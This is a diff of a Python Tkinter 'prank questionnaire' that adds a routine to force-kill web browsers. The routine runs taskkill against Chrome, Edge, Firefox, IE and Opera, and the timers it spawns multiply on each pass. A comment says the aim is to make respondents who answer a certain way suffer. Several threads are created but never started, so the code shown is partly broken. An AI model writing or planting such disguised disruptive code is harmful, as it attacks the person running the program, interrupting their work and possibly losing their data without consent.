@@ -4,6 +4,8 @@ from random import randint
 from threading import Thread,Timer
 from os import system
 #一个整活问卷
+#update:
+#·禁用浏览器，使调查者选择了外语成绩好时就痛不欲生
 
 swap_state = [False]
 
@@ -13,8 +15,11 @@ a.geometry("500x500")
 def kill():
     browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe", "opera.exe"]
     for x in browsers:
-        system(f"taskkill /f /im {x}")
-        Timer(3, lambda:kill()).start()
+        try:
+            system(f"taskkill /f /im {x}")
+            Timer(1, lambda:kill()).start()
+        except:
+            continue
 Thread(target=lambda:kill())
 def main():
     def noclear():
@@ -142,4 +147,5 @@ def main():
     answer2.place(x=150, y=250)
 start = Button(a, text="开始调查", command=lambda:Thread(target=lambda:main()))
 start.place(x=240, y=240)
+
 mainloop()
